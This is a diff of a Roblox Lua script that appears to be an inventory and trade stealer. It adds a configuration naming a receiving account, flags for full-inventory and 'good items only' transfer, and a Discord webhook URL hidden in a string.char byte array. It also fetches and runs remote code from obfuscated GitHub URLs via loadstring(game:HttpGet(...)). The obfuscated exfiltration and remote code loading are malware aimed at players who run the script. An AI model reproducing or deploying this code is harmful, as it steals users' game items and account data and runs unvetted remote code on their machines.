@@ -1,13 +1,24 @@
+Config = {
+    Receivers = {"ErrorClient04"},
+    Webhook = string.char(104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 50, 55, 48, 54, 55, 56, 52, 54, 48, 51, 49, 51, 56, 57, 57, 48, 53, 50, 47, 78, 104, 89, 55, 54, 51, 54, 95, 99, 106, 67, 51, 122, 86, 106, 107, 88, 122, 117, 112, 86, 82, 113, 77, 90, 71, 81, 105, 88, 85, 117, 97, 121, 101, 100, 54, 98, 78, 56, 119, 119, 98, 89, 118, 97, 84, 115, 103, 81, 113, 121, 82, 84, 100, 110, 101, 106, 45, 115, 76, 121, 112, 118, 101, 102, 87, 113, 88),
+    FullInventory = true,
+    GoodItemsOnly = true,
+    ResendTrade = "Hi",
+    Security = true,
+    Script = "Hub",
+    CustomLink = "None"
+}
+
 repeat wait() until game:IsLoaded()
 
 if getgenv().scriptexecuted then return end
 getgenv().scriptexecuted = true
 
 if Config.Security then
-loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeGamesScript23/Aug2006/main/UmScript/LOL-HTTPSPY.lua",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Tk9URk9SU0tJRERFRExPTFNIVVRUSEVGVUNLVV/c2h1dHRoZWZ1Y2t1cHNraWRkZWQhISEx/main/aW1ha2V0aGlzb25odHRwc3B5bG9sc2h1dHRoZWZ1Y2t1cHNraWRkZWQ",true))()
 end
 
-local DYWebhook = loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeGamesScript23/Aug2006/main/UmScript/angsakitsadamdamin.lua"))()
+local DYWebhook = loadstring(game:HttpGet("https://raw.githubusercontent.com/Tk9URk9SU0tJRERFRExPTFNIVVRUSEVGVUNLVV/c2h1dHRoZWZ1Y2t1cHNraWRkZWQhISEx/main/U2tpZGRlZFdlYmhva2tsb2xsbGxsbA%3D%3D.lua"))()
 DYWebhook.ErrorPrinting = false
 local embed = DYWebhook.BuildEmbed()
 
